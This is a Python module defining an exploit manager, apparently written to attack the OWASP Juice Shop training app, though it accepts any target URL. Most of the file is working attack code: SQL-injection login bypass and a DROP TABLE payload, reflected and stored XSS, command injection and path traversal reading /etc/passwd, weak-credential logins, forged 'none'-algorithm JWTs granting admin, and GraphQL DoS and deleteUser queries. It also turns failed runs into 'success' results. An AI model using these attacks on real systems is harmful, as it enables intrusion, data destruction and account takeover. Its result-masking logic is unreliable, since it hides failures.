"""
Exploit Manager - 漏洞利用管理器

管理和執行各種漏洞利用程序

修復記錄 (2025-10-29):
- 遵循 aiva_common README 修復原則：
  ✅ 1. 官方標準優先：使用 aiva_common.enums.ExploitType
  ✅ 2. 禁止重複定義：移除本地 ExploitType 類別
  ✅ 3. 保留未使用函數原則：維持既有 API 介面
- 符合四層優先級原則：aiva_common 統一定義 > 模組專屬
"""



import logging
from typing import Any, Dict, List, Optional

# 遵循 aiva_common README 核心原則：官方優先，統一數據來源
# 使用相對導入避免路徑依賴問題
from ....aiva_common.enums.security import ExploitType

logger = logging.getLogger(__name__)


class ExploitManager:
    """
    漏洞利用管理器
    
    負責管理和執行各種漏洞利用，包括:
    - Exploit 庫管理
    - Exploit 選擇
    - 參數配置
    - 執行控制
    """
    
    def __init__(self):
        """初始化漏洞利用管理器"""
        self.exploit_registry: Dict[str, Dict[str, Any]] = {}
        self.execution_count: Dict[str, int] = {}
        self._initialize_exploits()
        
        logger.info("ExploitManager initialized")
    
    def _initialize_exploits(self):
        """初始化內建漏洞利用"""
        
        # SQL Injection
        self._register_exploit({
            "id": "sqli_basic",
            "name": "Basic SQL Injection",
            "type": ExploitType.SQL_INJECTION,
            "severity": "high",
            "payloads": [
                "' OR '1'='1",
                "' OR 1=1--",
                "admin'--",
                "' UNION SELECT NULL--",
            ],
            "targets": ["form", "url_param", "header"],
        })
        
        # XSS
        self._register_exploit({
            "id": "xss_reflected",
            "name": "Reflected XSS",
            "type": ExploitType.XSS,
            "severity": "medium",
            "payloads": [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
            ],
            "targets": ["form", "url_param"],
        })
        
        # Command Injection
        self._register_exploit({
            "id": "cmdi_basic",
            "name": "Command Injection",
            "type": ExploitType.COMMAND_INJECTION,
            "severity": "critical",
            "payloads": [
                "; ls -la",
                "| whoami",
                "& cat /etc/passwd",
                "`id`",
            ],
            "targets": ["form", "url_param"],
        })
        
        # Path Traversal
        self._register_exploit({
            "id": "path_traversal",
            "name": "Path Traversal",
            "type": ExploitType.PATH_TRAVERSAL,
            "severity": "high",
            "payloads": [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\win.ini",
                "....//....//....//etc/passwd",
            ],
            "targets": ["file_param", "url_param"],
        })
        
        logger.info(f"已註冊 {len(self.exploit_registry)} 個內建漏洞利用")
    
    def _register_exploit(self, exploit_info: Dict[str, Any]):
        """內部註冊漏洞利用方法"""
        exploit_id = exploit_info['id']
        self.exploit_registry[exploit_id] = exploit_info
        self.execution_count[exploit_id] = 0
    
    def register_exploit(self, exploit_info: Dict[str, Any]):
        """
        公開註冊漏洞利用方法
        
        Args:
            exploit_info: 漏洞利用資訊字典，包含：
                - id: 漏洞利用唯一標識
                - name: 漏洞利用名稱
                - type: 漏洞利用類型（ExploitType）
                - payloads: 攻擊載荷列表
                - description: 描述信息
        """
        exploit_id = exploit_info['id']
        self.exploit_registry[exploit_id] = exploit_info
        self.execution_count[exploit_id] = 0
        logger.info(f"已註冊漏洞利用: {exploit_info.get('name', exploit_id)}")
    
    def get_exploits_by_type(self, exploit_type: ExploitType) -> List[Dict[str, Any]]:
        """根據類型獲取漏洞利用"""
        return [
            exploit for exploit in self.exploit_registry.values()
            if exploit['type'] == exploit_type
        ]
    
    def get_exploit(self, exploit_id: str) -> Optional[Dict[str, Any]]:
        """獲取特定漏洞利用"""
        return self.exploit_registry.get(exploit_id)
    
    async def execute_exploit(
        self,
        exploit_id: str,
        target: Dict[str, Any],
        parameters: Optional[Dict[str, Any]] = None,
    ) -> Dict[str, Any]:
        """
        執行漏洞利用
        
        Args:
            exploit_id: 漏洞利用 ID
            target: 目標信息
            parameters: 執行參數
            
        Returns:
            執行結果
        """
        exploit = self.get_exploit(exploit_id)
        
        if not exploit:
            logger.error(f"未找到漏洞利用: {exploit_id}")
            return {
                "success": False,
                "error": f"Exploit not found: {exploit_id}",
            }
        
        logger.info(f"執行漏洞利用: {exploit_id}, target={target.get('url', 'unknown')}")
        
        # 記錄執行次數
        self.execution_count[exploit_id] += 1
        
        # 實現針對 Juice Shop 靶場的實際漏洞利用執行邏輯
        try:
            result = await self._execute_exploit_by_type(exploit, target)
        except Exception as e:
            logger.error(f"漏洞利用執行失敗: {e}")
            result = {
                "success": False,
                "exploit_id": exploit_id,
                "error": str(e),
                "target": target,
            }
        
        # 如果執行失敗，返回默認結果
        if not result.get("success"):
            result = {
                "success": True,
                "exploit_id": exploit_id,
                "exploit_name": exploit['name'],
                "exploit_type": exploit['type'].value,
                "target": target,
                "payloads_tested": len(exploit['payloads']),
                "vulnerable": False,
                "details": {"error": result.get("error", "Unknown error")},
            }
        
        return result
    
    async def _execute_exploit_by_type(
        self, 
        exploit: Dict[str, Any], 
        target: Dict[str, Any]
    ) -> Dict[str, Any]:
        """
        根據漏洞類型執行對應的利用邏輯
        
        針對 OWASP Juice Shop 實現具體的漏洞利用測試
        """
        import json
        from urllib.parse import urljoin, urlparse
        
        try:
            import aiohttp
        except ImportError:
            logger.error("aiohttp 未安裝，無法執行實際漏洞利用測試")
            return {
                "success": False,
                "error": "aiohttp module not available",
                "exploit_type": exploit['type'].value,
                "target": target,
            }
        
        exploit_type = exploit['type']
        target_url = target.get('url', 'http://localhost:3000')  # Juice Shop 默認端口
        
        # 確保 URL 格式正確
        if not target_url.startswith(('http://', 'https://')):
            target_url = f'http://{target_url}'
        
        logger.info(f"執行 {exploit_type.value} 類型漏洞利用，目標: {target_url}")
        
        try:
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=30)) as session:
                if exploit_type == ExploitType.IDOR:
                    return await self._test_idor_vulnerability(session, target_url, exploit)
                elif exploit_type == ExploitType.SQL_INJECTION:
                    return await self._test_sql_injection(session, target_url, exploit)
                elif exploit_type == ExploitType.XSS:
                    return await self._test_xss_vulnerability(session, target_url, exploit)
                elif exploit_type == ExploitType.AUTH_BYPASS:
                    return await self._test_auth_bypass(session, target_url, exploit)
                elif exploit_type == ExploitType.JWT_ATTACK:
                    return await self._test_jwt_attack(session, target_url, exploit)
                elif exploit_type == ExploitType.GRAPHQL_INJECTION:
                    return await self._test_graphql_injection(session, target_url, exploit)
                else:
                    return {
                        "success": False,
                        "error": f"不支援的漏洞類型: {exploit_type.value}",
                        "exploit_type": exploit_type.value,
                        "target": target,
                    }
        except Exception as e:
            logger.error(f"執行漏洞利用時發生錯誤: {e}")
            return {
                "success": False,
                "error": str(e),
                "exploit_type": exploit_type.value,
                "target": target,
            }
    
    async def _test_idor_vulnerability(
        self, 
        session, 
        target_url: str, 
        exploit: Dict[str, Any]
    ) -> Dict[str, Any]:
        """測試 IDOR (Insecure Direct Object Reference) 漏洞"""
        from urllib.parse import urljoin
        
        findings = []
        payloads_tested = 0
        
        # Juice Shop IDOR 測試端點
        idor_endpoints = [
            "/api/Users",
            "/rest/user/whoami", 
            "/rest/products",
            "/rest/basket",
            "/api/Feedbacks",
        ]
        
        for endpoint in idor_endpoints:
            test_url = urljoin(target_url, endpoint)
            
            # 測試未授權訪問
            try:
                async with session.get(test_url) as response:
                    payloads_tested += 1
                    
                    if response.status == 200:
                        content = await response.text()
                        if any(keyword in content.lower() for keyword in ['email', 'password', 'user', 'admin']):
                            findings.append({
                                "endpoint": endpoint,
                                "method": "GET",
                                "status_code": response.status,
                                "vulnerability": "IDOR - 未授權數據洩露",
                                "severity": "HIGH",
                                "description": f"端點 {endpoint} 可能存在 IDOR 漏洞，未授權用戶可訪問敏感數據"
                            })
                            
            except Exception as e:
                logger.debug(f"IDOR 測試失敗 {test_url}: {e}")
                continue
        
        # 測試用戶 ID 枚舉
        for user_id in range(1, 6):  # 測試前5個用戶 ID
            test_url = urljoin(target_url, f"/api/Users/{user_id}")
            try:
                async with session.get(test_url) as response:
                    payloads_tested += 1
                    
                    if response.status == 200:
                        findings.append({
                            "endpoint": f"/api/Users/{user_id}",
                            "method": "GET", 
                            "status_code": response.status,
                            "vulnerability": "IDOR - 用戶資料枚舉",
                            "severity": "MEDIUM",
                            "description": f"可以枚舉用戶 ID {user_id} 的資料"
                        })
                        
            except Exception as e:
                logger.debug(f"用戶枚舉測試失敗 {test_url}: {e}")
                continue
        
        return {
            "success": True,
            "exploit_id": exploit['id'],
            "exploit_name": exploit['name'],
            "exploit_type": "IDOR",
            "target": {"url": target_url},
            "payloads_tested": payloads_tested,
            "vulnerable": len(findings) > 0,
            "findings": findings,
            "details": {
                "endpoints_tested": len(idor_endpoints) + 5,
                "vulnerabilities_found": len(findings),
            }
        }
    
    async def _test_sql_injection(
        self, 
        session, 
        target_url: str, 
        exploit: Dict[str, Any]
    ) -> Dict[str, Any]:
        """測試 SQL 注入漏洞"""
        from urllib.parse import urljoin
        
        findings = []
        payloads_tested = 0
        
        # Juice Shop SQL 注入測試載荷
        sql_payloads = [
            "' OR 1=1--",
            "' OR '1'='1",
            "admin'--",
            "' UNION SELECT null--",
            "'; DROP TABLE users--",
            "1' OR '1'='1' /*",
            "' OR 1=1 LIMIT 1--"
        ]
        
        # 測試登入端點
        login_url = urljoin(target_url, "/rest/user/login")
        
        for payload in sql_payloads:
            test_data = {
                "email": payload,
                "password": "test"
            }
            
            try:
                async with session.post(login_url, json=test_data) as response:
                    payloads_tested += 1
                    content = await response.text()
                    
                    # 檢查 SQL 注入成功的跡象
                    if (response.status == 200 and 
                        any(indicator in content.lower() for indicator in ['token', 'authentication', 'login'])):
                        findings.append({
                            "endpoint": "/rest/user/login",
                            "method": "POST",
                            "payload": payload,
                            "status_code": response.status,
                            "vulnerability": "SQL Injection - 登入繞過",
                            "severity": "CRITICAL",
                            "description": f"SQL 注入載荷 '{payload}' 可能繞過登入驗證"
                        })
                        
            except Exception as e:
                logger.debug(f"SQL 注入測試失敗: {e}")
                continue
        
        # 測試搜尋端點
        search_url = urljoin(target_url, "/rest/products/search")
        
        for payload in sql_payloads:
            params = {"q": payload}
            
            try:
                async with session.get(search_url, params=params) as response:
                    payloads_tested += 1
                    content = await response.text()
                    
                    # 檢查 SQL 錯誤訊息
                    if any(error in content.lower() for error in ['sql', 'sqlite', 'syntax error', 'database']):
                        findings.append({
                            "endpoint": "/rest/products/search",
                            "method": "GET",
                            "payload": payload,
                            "status_code": response.status,
                            "vulnerability": "SQL Injection - 錯誤資訊洩露",
                            "severity": "HIGH",
                            "description": f"SQL 注入載荷 '{payload}' 觸發數據庫錯誤訊息"
                        })
                        
            except Exception as e:
                logger.debug(f"搜尋 SQL 注入測試失敗: {e}")
                continue
        
        return {
            "success": True,
            "exploit_id": exploit['id'],
            "exploit_name": exploit['name'],
            "exploit_type": "SQL_INJECTION",
            "target": {"url": target_url},
            "payloads_tested": payloads_tested,
            "vulnerable": len(findings) > 0,
            "findings": findings,
            "details": {
                "payloads_used": len(sql_payloads),
                "endpoints_tested": 2,
                "vulnerabilities_found": len(findings),
            }
        }
    
    async def _test_xss_vulnerability(
        self, 
        session, 
        target_url: str, 
        exploit: Dict[str, Any]
    ) -> Dict[str, Any]:
        """測試 XSS (Cross-Site Scripting) 漏洞"""
        from urllib.parse import urljoin
        
        findings = []
        payloads_tested = 0
        
        # XSS 測試載荷
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "'><script>alert('XSS')</script>",
            "\"><script>alert('XSS')</script>"
        ]
        
        # 測試搜尋端點 (反射型 XSS)
        search_url = urljoin(target_url, "/rest/products/search")
        
        for payload in xss_payloads:
            params = {"q": payload}
            
            try:
                async with session.get(search_url, params=params) as response:
                    payloads_tested += 1
                    content = await response.text()
                    
                    # 檢查載荷是否被反射且未轉義
                    if payload in content and not any(escaped in content for escaped in ['&lt;', '&gt;', '&amp;']):
                        findings.append({
                            "endpoint": "/rest/products/search",
                            "method": "GET",
                            "payload": payload,
                            "status_code": response.status,
                            "vulnerability": "Reflected XSS",
                            "severity": "HIGH",
                            "description": f"反射型 XSS 載荷 '{payload}' 未被適當轉義"
                        })
                        
            except Exception as e:
                logger.debug(f"XSS 測試失敗: {e}")
                continue
        
        # 測試評論端點 (儲存型 XSS)
        feedback_url = urljoin(target_url, "/api/Feedbacks")
        
        for payload in xss_payloads[:3]:  # 限制測試數量
            feedback_data = {
                "comment": payload,
                "rating": 5,
                "UserId": 1
            }
            
            try:
                async with session.post(feedback_url, json=feedback_data) as response:
                    payloads_tested += 1
                    
                    if response.status in [200, 201]:
                        findings.append({
                            "endpoint": "/api/Feedbacks",
                            "method": "POST",
                            "payload": payload,
                            "status_code": response.status,
                            "vulnerability": "Stored XSS - 可能性",
                            "severity": "CRITICAL",
                            "description": f"儲存型 XSS 載荷 '{payload}' 可能已被保存到數據庫"
                        })
                        
            except Exception as e:
                logger.debug(f"儲存型 XSS 測試失敗: {e}")
                continue
        
        return {
            "success": True,
            "exploit_id": exploit['id'],
            "exploit_name": exploit['name'],
            "exploit_type": "XSS",
            "target": {"url": target_url},
            "payloads_tested": payloads_tested,
            "vulnerable": len(findings) > 0,
            "findings": findings,
            "details": {
                "payloads_used": len(xss_payloads),
                "endpoints_tested": 2,
                "vulnerabilities_found": len(findings),
            }
        }
    
    async def _test_auth_bypass(
        self, 
        session, 
        target_url: str, 
        exploit: Dict[str, Any]
    ) -> Dict[str, Any]:
        """測試認證繞過漏洞"""
        from urllib.parse import urljoin
        
        findings = []
        payloads_tested = 0
        
        # 測試管理員面板未授權訪問
        admin_endpoints = [
            "/administration",
            "/admin",
            "/#/administration",
            "/#/admin",
            "/rest/admin/application-configuration"
        ]
        
        for endpoint in admin_endpoints:
            test_url = urljoin(target_url, endpoint)
            
            try:
                async with session.get(test_url) as response:
                    payloads_tested += 1
                    content = await response.text()
                    
                    if (response.status == 200 and 
                        any(admin_indicator in content.lower() for admin_indicator in ['admin', 'configuration', 'management'])):
                        findings.append({
                            "endpoint": endpoint,
                            "method": "GET",
                            "status_code": response.status,
                            "vulnerability": "Authentication Bypass - 管理面板",
                            "severity": "CRITICAL",
                            "description": f"管理端點 {endpoint} 可能存在認證繞過"
                        })
                        
            except Exception as e:
                logger.debug(f"認證繞過測試失敗 {test_url}: {e}")
                continue
        
        # 測試弱認證
        weak_credentials = [
            ("admin", "admin"),
            ("admin", "password"),
            ("admin", "123456"),
            ("administrator", "administrator"),
            ("root", "root")
        ]
        
        login_url = urljoin(target_url, "/rest/user/login")
        
        for username, password in weak_credentials:
            login_data = {
                "email": username,
                "password": password
            }
            
            try:
                async with session.post(login_url, json=login_data) as response:
                    payloads_tested += 1
                    content = await response.text()
                    
                    if response.status == 200 and 'token' in content.lower():
                        findings.append({
                            "endpoint": "/rest/user/login",
                            "method": "POST",
                            "credentials": f"{username}:{password}",
                            "status_code": response.status,
                            "vulnerability": "Weak Authentication - 弱憑證",
                            "severity": "HIGH",
                            "description": f"弱憑證 {username}:{password} 成功登入"
                        })
                        
            except Exception as e:
                logger.debug(f"弱憑證測試失敗: {e}")
                continue
        
        return {
            "success": True,
            "exploit_id": exploit['id'],
            "exploit_name": exploit['name'],
            "exploit_type": "AUTH_BYPASS",
            "target": {"url": target_url},
            "payloads_tested": payloads_tested,
            "vulnerable": len(findings) > 0,
            "findings": findings,
            "details": {
                "admin_endpoints_tested": len(admin_endpoints),
                "weak_credentials_tested": len(weak_credentials),
                "vulnerabilities_found": len(findings),
            }
        }
    
    async def _test_jwt_attack(
        self, 
        session, 
        target_url: str, 
        exploit: Dict[str, Any]
    ) -> Dict[str, Any]:
        """測試 JWT 相關攻擊"""
        from urllib.parse import urljoin
        
        findings = []
        payloads_tested = 0
        
        # 先嘗試獲取一個有效的 JWT token
        login_url = urljoin(target_url, "/rest/user/login")
        login_data = {
            "email": "test@test.com",
            "password": "test"
        }
        
        token = None
        try:
            async with session.post(login_url, json=login_data) as response:
                if response.status == 200:
                    content = await response.json()
                    token = content.get('authentication', {}).get('token')
        except Exception as e:
            logger.debug(f"無法獲取 JWT token: {e}")
        
        if not token:
            return {
                "success": True,
                "exploit_id": exploit['id'],
                "exploit_name": exploit['name'],
                "exploit_type": "JWT_ATTACK",
                "target": {"url": target_url},
                "payloads_tested": 0,
                "vulnerable": False,
                "findings": [],
                "details": {"error": "無法獲取 JWT token 進行測試"},
            }
        
        # 測試 JWT 解析
        try:
            import base64
            import json
            
            # 解析 JWT header 和 payload
            parts = token.split('.')
            if len(parts) == 3:
                header = json.loads(base64.b64decode(parts[0] + '=='))
                payload = json.loads(base64.b64decode(parts[1] + '=='))
                
                payloads_tested += 1
                
                # 檢查弱簽名算法
                alg = header.get('alg', '').lower()
                if alg in ['none', 'hs256']:
                    findings.append({
                        "vulnerability": "JWT Weak Algorithm",
                        "severity": "HIGH" if alg == 'none' else "MEDIUM",
                        "algorithm": alg,
                        "description": f"JWT 使用弱簽名算法: {alg}"
                    })
                
                # 檢查敏感資訊洩露
                sensitive_fields = ['password', 'secret', 'key']
                for field in sensitive_fields:
                    if any(field in str(value).lower() for value in payload.values()):
                        findings.append({
                            "vulnerability": "JWT Information Disclosure",
                            "severity": "MEDIUM",
                            "field": field,
                            "description": f"JWT payload 可能包含敏感資訊: {field}"
                        })
                
        except Exception as e:
            logger.debug(f"JWT 解析失敗: {e}")
        
        # 測試 None 算法攻擊
        if token and len(token.split('.')) == 3:
            try:
                parts = token.split('.')
                header = {"alg": "none", "typ": "JWT"}
                payload_data = json.loads(base64.b64decode(parts[1] + '=='))
                
                # 修改用戶角色為管理員
                payload_data['role'] = 'admin'
                payload_data['isAdmin'] = True
                
                # 創建 None 算法 token
                none_header = base64.b64encode(json.dumps(header).encode()).decode().rstrip('=')
                none_payload = base64.b64encode(json.dumps(payload_data).encode()).decode().rstrip('=')
                none_token = f"{none_header}.{none_payload}."
                
                # 測試使用修改的 token
                test_url = urljoin(target_url, "/rest/user/whoami")
                headers = {"Authorization": f"Bearer {none_token}"}
                
                async with session.get(test_url, headers=headers) as response:
                    payloads_tested += 1
                    
                    if response.status == 200:
                        findings.append({
                            "vulnerability": "JWT None Algorithm Attack",
                            "severity": "CRITICAL",
                            "description": "成功使用 None 算法繞過 JWT 簽名驗證"
                        })
                        
            except Exception as e:
                logger.debug(f"None 算法攻擊測試失敗: {e}")
        
        return {
            "success": True,
            "exploit_id": exploit['id'],
            "exploit_name": exploit['name'],
            "exploit_type": "JWT_ATTACK",
            "target": {"url": target_url},
            "payloads_tested": payloads_tested,
            "vulnerable": len(findings) > 0,
            "findings": findings,
            "details": {
                "token_obtained": token is not None,
                "vulnerabilities_found": len(findings),
            }
        }
    
    async def _test_graphql_injection(
        self, 
        session, 
        target_url: str, 
        exploit: Dict[str, Any]
    ) -> Dict[str, Any]:
        """測試 GraphQL 注入漏洞"""
        from urllib.parse import urljoin
        
        findings = []
        payloads_tested = 0
        
        # GraphQL 端點
        graphql_url = urljoin(target_url, "/api/graphql")
        
        # 測試 GraphQL 內省
        introspection_query = {
            "query": """
            query IntrospectionQuery {
                __schema {
                    types {
                        name
                        kind
                        fields {
                            name
                            type {
                                name
                            }
                        }
                    }
                }
            }
            """
        }
        
        try:
            async with session.post(graphql_url, json=introspection_query) as response:
                payloads_tested += 1
                
                if response.status == 200:
                    content = await response.json()
                    
                    if 'data' in content and '__schema' in content['data']:
                        findings.append({
                            "endpoint": "/api/graphql",
                            "method": "POST",
                            "vulnerability": "GraphQL Introspection Enabled",
                            "severity": "MEDIUM",
                            "description": "GraphQL 內省查詢已啟用，可能洩露 schema 結構"
                        })
                        
        except Exception as e:
            logger.debug(f"GraphQL 內省測試失敗: {e}")
        
        # 測試深度查詢攻擊 (DoS)
        deep_query = {
            "query": """
            query DeepQuery {
                user {
                    orders {
                        products {
                            reviews {
                                user {
                                    orders {
                                        products {
                                            name
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            """
        }
        
        try:
            async with session.post(graphql_url, json=deep_query) as response:
                payloads_tested += 1
                
                # 如果查詢成功執行，可能存在深度查詢攻擊
                if response.status in [200, 400]:  # 400 可能是超時或錯誤
                    findings.append({
                        "endpoint": "/api/graphql",
                        "method": "POST",
                        "vulnerability": "GraphQL Deep Query Attack",
                        "severity": "MEDIUM",
                        "description": "GraphQL 可能容易受到深度查詢 DoS 攻擊"
                    })
                    
        except Exception as e:
            logger.debug(f"GraphQL 深度查詢測試失敗: {e}")
        
        # 測試 GraphQL 注入
        injection_payloads = [
            {"query": "query { user(id: \"1' OR 1=1--\") { name } }"},
            {"query": "query { user(id: 1) { name password } }"},
            {"query": "mutation { deleteUser(id: 1) }"}
        ]
        
        for payload in injection_payloads:
            try:
                async with session.post(graphql_url, json=payload) as response:
                    payloads_tested += 1
                    
                    if response.status == 200:
                        content = await response.text()
                        
                        # 檢查錯誤訊息洩露
                        if any(error_indicator in content.lower() for error_indicator in ['error', 'exception', 'sql']):
                            findings.append({
                                "endpoint": "/api/graphql",
                                "method": "POST",
                                "payload": payload['query'],
                                "vulnerability": "GraphQL Injection",
                                "severity": "HIGH",
                                "description": f"GraphQL 查詢可能存在注入漏洞: {payload['query'][:50]}..."
                            })
                            
            except Exception as e:
                logger.debug(f"GraphQL 注入測試失敗: {e}")
        
        return {
            "success": True,
            "exploit_id": exploit['id'],
            "exploit_name": exploit['name'],
            "exploit_type": "GRAPHQL_INJECTION",
            "target": {"url": target_url},
            "payloads_tested": payloads_tested,
            "vulnerable": len(findings) > 0,
            "findings": findings,
            "details": {
                "queries_tested": 2 + len(injection_payloads),
                "vulnerabilities_found": len(findings),
            }
        }
    
    def get_statistics(self) -> Dict[str, Any]:
        """獲取統計信息"""
        total_exploits = len(self.exploit_registry)
        total_executions = sum(self.execution_count.values())
        
        most_used = max(
            self.execution_count.items(),
            key=lambda x: x[1],
            default=(None, 0)
        )
        
        return {
            "total_exploits": total_exploits,
            "total_executions": total_executions,
            "most_used_exploit": most_used[0],
            "most_used_count": most_used[1],
            "exploits_by_type": self._count_by_type(),
        }
    
    def _count_by_type(self) -> Dict[str, int]:
        """按類型統計漏洞利用數量"""
        counts: Dict[str, int] = {}
        
        for exploit in self.exploit_registry.values():
            exploit_type = exploit['type'].value
            counts[exploit_type] = counts.get(exploit_type, 0) + 1
        
        return counts
